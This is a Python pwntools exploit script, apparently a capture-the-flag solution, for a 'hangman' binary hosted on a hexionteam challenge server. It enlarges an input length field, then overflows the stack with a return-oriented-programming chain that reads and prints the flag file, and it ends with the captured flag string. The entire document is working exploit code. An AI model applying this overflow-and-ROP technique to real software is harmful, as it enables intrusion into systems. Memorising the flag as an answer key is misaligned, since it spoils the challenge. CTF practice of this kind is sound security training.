#!/usr/bin/env python3
from pwn import *

buffer_offset = -0x38
ret_offset = 0x8
flag_str = 0x40232c
get_word = 0x4012d6
puts_rax = 0x4016e8
pop_rdi = 0x4019a3
puts_addr = 0x401050
pop_rsi_pop_r15 = 0x4019a1

if args.LOCAL:
    io = process(['./hangman'])
    gdb.attach(io, gdbscript='''
b *0x401893
c
''')
else:
    io = remote('challenges1.hexionteam.com', 3000)

rop_offset = ret_offset - buffer_offset
rop = b''.join((
    # rdi = flag_str_addr
    struct.pack('<QQ', pop_rdi, flag_str),
    # rsi = 64
    struct.pack('<QQQ', pop_rsi_pop_r15, 64, 0),
    # call getWord()
    struct.pack('<Q', get_word),
    # puts(result)
    struct.pack('<Q', puts_rax),
))

io.recvuntil('Enter choice: ')
io.sendline('2')
io.recvuntil('Enter word: ')
io.send(flat({
    32: bytes((rop_offset + len(rop),))
}))

io.recvuntil('Enter choice: ')
io.sendline('2')
io.recvuntil('Enter word: ')
io.sendline(flat({
    rop_offset: rop,
}))

io.recvuntil('Enter choice: ')
io.sendline('3')

io.interactive()

# hexCTF{e1th3r_y0u_gu3ss_0r_y0u_h4ng}
